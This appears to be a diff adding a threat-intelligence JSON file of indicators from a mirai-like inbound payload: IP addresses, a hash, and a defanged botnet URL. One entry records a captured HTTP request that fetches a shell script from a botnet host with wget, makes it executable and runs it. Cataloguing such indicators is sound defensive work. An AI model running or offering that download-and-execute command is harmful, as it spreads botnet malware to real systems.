@@ -1,0 +1,33 @@
+[
+  {
+    "context": "Embedded IP in inbound payload",
+    "source": "static_analysis",
+    "type": "ip",
+    "value": "190.179.175.XXX"
+  },
+  {
+    "context": "Embedded URL in inbound payload",
+    "source": "strings",
+    "type": "url",
+    "value": "hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh"
+  },
+  {
+    "context": "Inbound payload hash (mirai-like)",
+    "source": "static_analysis",
+    "type": "hash",
+    "value": "52a5a11eb588b4172e5ee9b1265e89641db42bc1065e0c9e08cc4ab6ae366e4a"
+  },
+  {
+    "context": "Suspicious command in inbound payload",
+    "source": "strings",
+    "type": "command",
+    "value": "GET /shell?cd+/tmp;rm+-rf+kla.sh;wget+hxxp://aibotnet[.]su/bins/kla.sh;chmod+777+kla.sh;./kla.sh HTTP/1.1"
+  },
+  {
+    "asn": "Hostkey B.v.",
+    "country": "Germany",
+    "role": "artifact_source",
+    "type": "ip",
+    "value": "132.243.194.XXX"
+  }
+]
